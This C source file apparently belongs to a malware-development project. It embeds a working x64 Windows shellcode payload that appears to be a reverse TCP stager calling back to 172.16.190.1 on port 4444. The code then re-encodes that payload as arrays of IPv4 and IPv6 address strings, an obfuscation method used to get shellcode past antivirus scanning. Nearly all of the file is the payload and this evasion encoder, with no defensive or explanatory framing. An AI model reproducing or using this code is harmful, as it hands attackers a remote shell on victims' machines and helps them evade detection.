#include "glassBox.h"

unsigned char puke[] =
"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50"
"\x52\x48\x31\xd2\x51\x56\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x48\x8b\x52\x20\x41"
"\x51\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f"
"\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00\x48\x85\xc0"
"\x74\x67\x48\x01\xd0\x44\x8b\x40\x20\x49\x01\xd0\x50\x8b"
"\x48\x18\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6"
"\x4d\x31\xc9\x48\x31\xc0\x41\xc1\xc9\x0d\xac\x41\x01\xc1"
"\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8"
"\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
"\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x41\x58\x41\x58"
"\x5e\x48\x01\xd0\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83"
"\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9"
"\x4b\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00"
"\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49"
"\x89\xe5\x49\xbc\x02\x00\x11\x5c\xac\x10\xbe\x01\x41\x54"
"\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5"
"\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b"
"\x00\xff\xd5\x6a\x0a\x41\x5e\x50\x50\x4d\x31\xc9\x4d\x31"
"\xc0\x48\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41"
"\xba\xea\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58"
"\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5"
"\x85\xc0\x74\x0a\x49\xff\xce\x75\xe5\xe8\x93\x00\x00\x00"
"\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9\x6a\x04\x41\x58"
"\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00"
"\x7e\x55\x48\x83\xc4\x20\x5e\x89\xf6\x6a\x40\x41\x59\x68"
"\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41\xba"
"\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31"
"\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9"
"\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x41\x57\x59\x68"
"\x00\x40\x00\x00\x41\x58\x6a\x00\x5a\x41\xba\x0b\x2f\x0f"
"\x30\xff\xd5\x57\x59\x41\xba\x75\x6e\x4d\x61\xff\xd5\x49"
"\xff\xce\xe9\x3c\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48"
"\x85\xf6\x75\xb4\x41\xff\xe7\x58\x6a\x00\x59\xbb\xe0\x1d"
"\x2a\x0a\x41\x89\xda\xff\xd5";



// Function takes 4 raw bytes and returns them in an IPv4 string format
void GenerateIpv4(int a, int b, int c, int d, char* Output, size_t OutputSize) {

	snprintf(Output, OutputSize, "%d.%d.%d.%d", a, b, c, d);
}

BOOL GenerateIpv4Output(unsigned char* pShellcode, SIZE_T ShellcodeSize) {

	if (pShellcode == NULL || ShellcodeSize == 0) {
		warn("Payload is NULL");
		return EXIT_FAILURE;
	}

	//calculate padded size (next multiple of 4)
	SIZE_T PaddedSize = ShellcodeSize;

	while (PaddedSize % 4 != 0)
	{
		PaddedSize++;
	}


	// Allocate zero-initialzed buffer
	unsigned char* PaddedBuffer = calloc(PaddedSize, 1);

	if (PaddedBuffer == NULL) {
		warn("Failed to allocate padded buffer");
		return EXIT_FAILURE;
	}

	// Copy original shellcode, any remaining bytes stay 0x00 because of calloc()
	memcpy(PaddedBuffer, pShellcode, ShellcodeSize);

	info("Payload size: %zu bytes", ShellcodeSize);
	info("Padded size: %zu bytes \n", PaddedSize);

	printf("char* ipv4Array[] = {\n\t");

	int counter = 0;
	char IP[32];

	for (SIZE_T i = 0; i < PaddedSize; i += 4) {
		counter++;

		GenerateIpv4(
			PaddedBuffer[i],
			PaddedBuffer[i + 1],
			PaddedBuffer[i + 2],
			PaddedBuffer[i + 3],
			IP,
			sizeof(IP)
		);

		if (i == PaddedSize - 4)
			printf("\"%s\"", IP);

		else
			printf("\"%s\",", IP);

		if (counter % 8 == 0)
			printf("\n\t");

	}

	printf("\n};\n\n");
	free(PaddedBuffer);
	return EXIT_SUCCESS;
}

// Function takes in 16 raw bytes and returns them in an IPv6 address string format
void GenerateIpv6(int a, int b, int c, int d, int e, int f, int g, int h, int i, int j, int k, int l, int m, int n, int o, int p, char* Output, SIZE_T OutputSize) {

	snprintf(
		Output,
		OutputSize,
		"%02X%02X:%02X%02X:%02X%02X:%02X%02X:"
		"%02X%02X:%02X%02X:%02X%02X:%02X%02X",
		a, b, c, d,
		e, f, g, h,
		i, j, k, l,
		m, n, o, p);
}

BOOL GenerateIpv6Output(unsigned char* pShellcode, SIZE_T ShellcodeSize) {

	if (pShellcode == NULL || ShellcodeSize == 0) {
		warn("Payload is NULL");
		return EXIT_FAILURE;
	}

	//calculate padded size (next multiple of 16)
	SIZE_T PaddedSize = ShellcodeSize;

	while (PaddedSize % 16 != 0)
	{
		PaddedSize++;
	}

	// Allocate zero-initialzed buffer
	unsigned char* PaddedBuffer = calloc(PaddedSize, 1);

	if (PaddedBuffer == NULL) {
		warn("Failed to allocate padded buffer");
		return EXIT_FAILURE;
	}

	memcpy(PaddedBuffer, pShellcode, ShellcodeSize);

	info("Payload size: %zu bytes", ShellcodeSize);
	info("Padded size: %zu bytes \n", PaddedSize);

	printf("char* ipv6Array[] = {\n\t");

	char IP[64];
	int counter = 0;

	for (SIZE_T i = 0; i < PaddedSize; i += 16)
	{
		counter++;

		GenerateIpv6(
			PaddedBuffer[i],
			PaddedBuffer[i + 1],
			PaddedBuffer[i + 2],
			PaddedBuffer[i + 3],

			PaddedBuffer[i + 4],
			PaddedBuffer[i + 5],
			PaddedBuffer[i + 6],
			PaddedBuffer[i + 7],

			PaddedBuffer[i + 8],
			PaddedBuffer[i + 9],
			PaddedBuffer[i + 10],
			PaddedBuffer[i + 11],

			PaddedBuffer[i + 12],
			PaddedBuffer[i + 13],
			PaddedBuffer[i + 14],
			PaddedBuffer[i + 15],

			IP,
			sizeof(IP)
			);

		if (i == PaddedSize - 16)
			printf("\"%s\"", IP);
		else
			printf("\"%s\", ", IP);

		if (counter % 3 == 0)
			printf("\n\t");
	}

	printf("\n};\n\n");

	free(PaddedBuffer);
	return EXIT_SUCCESS;
}



int main(void) {
	info("Generating IPv4 representation of payload...");

	if (GenerateIpv4Output(puke, sizeof(puke) - 1) != EXIT_SUCCESS) {
		warn("Failed to generate IPv4 output\n");
		return EXIT_FAILURE;
	}

	info("Generating IPv6 representation of payload...");
	if (GenerateIpv6Output(puke, sizeof(puke) - 1) != EXIT_SUCCESS) {
		warn("Failed to generate IPv6 output\n");
		return EXIT_FAILURE;
	}

	info("Done.\n");
	return EXIT_SUCCESS;
}

